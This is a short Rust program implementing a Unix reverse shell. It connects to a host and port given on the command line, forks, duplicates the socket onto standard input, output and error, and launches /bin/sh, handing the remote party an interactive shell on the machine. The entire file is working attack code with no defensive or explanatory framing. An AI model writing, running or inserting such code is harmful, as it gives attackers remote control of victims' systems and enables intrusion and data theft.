use std::env;
use std::net::{TcpStream, SocketAddr};
use std::process::{Command, exit};
use std::os::unix::io::{AsRawFd};

// Importing `dup2` from `libc`
use libc::{dup2, c_int};

fn main() {
    let args: Vec<String> = env::args().collect();
    
    let lhost = &args[1];
    let lport = &args[2];
    
    let sa = format!("{}:{}", lhost, lport);
    let sa: SocketAddr = sa.parse().expect("Failed to parse socket address");
    
    let s = match TcpStream::connect(sa) {
        Ok(stream) => stream,
        Err(_) => {
            eprintln!("Failed to connect");
            exit(1);
        }
    };
   
    
    let child = match unsafe { libc::fork() } {
        -1 => {
            eprintln!("Failed to fork");
            exit(1);
        }
        0 => {
            let _ = unsafe { dup2(s.as_raw_fd(), 0) };
            let _ = unsafe { dup2(s.as_raw_fd(), 1) };
            let _ = unsafe { dup2(s.as_raw_fd(), 2) };
            
            Command::new("/bin/sh")
                .spawn()
                .expect("Failed to execute shell");
                
            exit(0);
        }
        _ => exit(0),
    };
    
    let _ = child;
}

